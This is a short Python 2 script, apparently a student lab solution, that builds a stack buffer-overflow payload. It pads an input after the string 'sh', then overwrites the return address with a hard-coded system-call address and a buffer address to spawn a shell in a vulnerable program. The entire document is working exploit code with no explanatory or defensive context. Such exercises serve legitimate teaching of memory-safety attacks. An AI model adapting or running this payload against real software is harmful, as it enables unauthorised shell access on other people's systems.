from struct import pack
from shellcode import shellcode

bufAddr = 0xbffea0d6
sysCallAddr = 0x08048eed
retadd = sysCallAddr

print "sh" + "\"" * (30-4-4-2) + pack("<I", retadd) + pack("<I", bufAddr)